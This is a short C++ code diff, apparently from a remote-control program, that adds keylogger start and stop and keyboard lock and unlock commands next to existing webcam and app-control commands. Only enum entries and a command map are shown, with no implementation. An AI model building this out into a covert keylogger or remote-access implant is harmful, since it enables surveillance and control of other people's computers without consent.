@@ -22,7 +22,11 @@ enum COMMANDS {
 	STOP_WEBCAM,
 	LIST_APPS,
 	START_APP,
-	STOP_APP
+	STOP_APP,
+	START_KEYLOGGER,
+	STOP_KEYLOGGER,
+	LOCK_KEYBOARD,
+	UNLOCK_KEYBOARD
 };
 
 const std::map<std::string, COMMANDS> commandMap = {
@@ -39,5 +43,9 @@ const std::map<std::string, COMMANDS> commandMap = {
 	{"stop_webcam", STOP_WEBCAM},
 	{"list_app", LIST_APPS},
 	{"start_app", START_APP},
-	{"stop_app", STOP_APP}
+	{"stop_app", STOP_APP},
+	{"start_keylogger", START_KEYLOGGER},
+	{"stop_keylogger", STOP_KEYLOGGER},
+	{"lock_keyboard", LOCK_KEYBOARD},
+	{"unlock_keyboard", UNLOCK_KEYBOARD}
 };
